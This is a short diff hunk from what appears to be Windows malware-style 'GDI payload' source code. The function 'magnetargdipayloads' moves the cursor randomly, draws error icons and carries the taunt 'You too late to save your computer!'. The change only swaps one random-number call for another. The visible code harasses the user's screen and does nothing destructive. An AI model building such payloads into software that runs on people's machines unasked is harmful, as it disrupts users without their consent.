@@ -287,7 +287,7 @@ DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 		rainbow = CreateSolidBrush(clrrainbow);
 		LPCWSTR txtmg = L"You too late to save your computer!";
 
-		SetCursorPos(rand() % width + 1, rand() % height + 1);
+		SetCursorPos(rng() % width + 1, rng() % height + 1);
 		POINT cursor;
 		GetCursorPos(&cursor);
 		DrawIcon(hdc, cursor.x - iconx, cursor.y - icony, error);
